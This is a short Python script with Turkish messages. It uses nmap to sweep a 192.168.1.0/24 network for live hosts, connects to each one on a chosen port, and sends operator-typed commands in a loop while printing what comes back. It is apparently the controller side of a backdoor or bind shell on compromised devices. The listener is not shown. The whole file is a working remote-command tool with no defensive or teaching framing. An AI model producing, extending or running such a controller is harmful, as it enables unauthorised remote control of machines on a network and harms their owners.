import socket
import threading
import subprocess

def get_active_ips():
    print("[✓] Ağ taranıyor...")
    result = subprocess.check_output(["nmap", "-sn", "192.168.1.0/24"]).decode()
    lines = result.split("\n")
    ips = []
    for line in lines:
        if "Nmap scan report for" in line:
            ip = line.split()[-1]
            if ip.startswith("192.168.1.") and not ip.endswith(".1"):
                ips.append(ip)
    return ips

def client_handler(ip, port):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, port))
        print(f"[✓] Bağlantı başarılı: {ip}")

        cihaz = s.recv(1024).decode()
        print(f"[✓] Cihaz: {cihaz}")

        while True:
            komut = input("Komut >> ")
            if komut == "exit":
                s.send(b"exit")
                break
            s.send(komut.encode())
            print(s.recv(2048).decode())

        s.close()
    except Exception as e:
        print(f"[!] {ip} bağlantı hatası: {e}")

if __name__ == "__main__":
    port = int(input("Port gir >> "))
    aktifler = get_active_ips()
    print(f"[✓] Aktif IP'ler: {aktifler}")

    for ip in aktifler:
        threading.Thread(target=client_handler, args=(ip, port)).start()
